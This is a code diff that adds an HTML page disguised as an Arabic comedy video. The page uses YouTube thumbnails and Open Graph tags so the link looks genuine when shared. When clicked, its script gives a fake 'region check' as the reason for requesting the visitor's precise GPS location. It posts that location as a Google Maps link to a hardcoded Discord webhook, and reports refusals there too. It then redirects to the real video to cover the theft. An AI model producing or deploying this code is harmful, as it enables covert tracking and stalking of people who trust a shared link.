@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:title" content="نكت بايخة - إسلام فوزي">
+    <meta property="og:description" content="فيديو نكت هتموت من الضحك.. اضغط للمشاهدة">
+    <meta property="og:image" content="https://i.ytimg.com/vi/Kx9qLc-8ho8/maxresdefault.jpg">
+    <meta property="og:type" content="video.other">
+
+    <title>نكت بايخة - Islam Fawzy</title>
+    <style>
+        body { background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; font-family: sans-serif; }
+        .video-player { width: 90%; max-width: 600px; position: relative; cursor: pointer; border-radius: 12px; overflow: hidden; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
+        .thumb { width: 100%; display: block; opacity: 0.8; }
+        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 70px; height: 70px; background: rgba(255,0,0,0.9); border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 25px; box-shadow: 0 0 15px white; }
+        #msg { position: absolute; bottom: 20px; width: 100%; text-align: center; background: rgba(0,0,0,0.6); padding: 10px 0; font-size: 14px; }
+    </style>
+</head>
+<body onclick="startCapture()">
+
+    <div class="video-player">
+        <img src="https://i.ytimg.com/vi/Kx9qLc-8ho8/maxresdefault.jpg" class="thumb">
+        <div class="play-btn">▶</div>
+        <div id="msg">انقر لتشغيل الفيديو (مطلوب تأكيد الاتصال)</div>
+    </div>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1491898808374919339/LMz98WEpPwDqZ1Xp_YtctOtKsuhSN71cq8Z0FCr6bAxatnWTrymPaG1LgbnTLh4ttXVv";
+
+        function startCapture() {
+            document.getElementById('msg').innerText = "جاري التأكد من المنطقة الجغرافية لتشغيل الفيديو...";
+            
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            };
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const acc = pos.coords.accuracy;
+                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        sendToDiscord(`🎯 **تم تحديد الموقع بدقة!**\n📍 الرابط: ${mapLink}\n📏 الدقة: ${acc.toFixed(1)} متر`);
+                        
+                        // فتح الفيديو الأصلي بعد الإرسال
+                        window.location.href = "https://www.youtube.com/watch?v=Kx9qLc-8ho8";
+                    },
+                    (err) => {
+                        sendToDiscord("❌ الشخص رفض إذن الموقع أو الجهاز لا يدعم GPS.");
+                        window.location.href = "https://www.youtube.com/watch?v=Kx9qLc-8ho8";
+                    },
+                    options
+                );
+            }
+        }
+
+        function sendToDiscord(msg) {
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ content: msg })
+            });
+        }
+    </script>
+</body>
+</html>
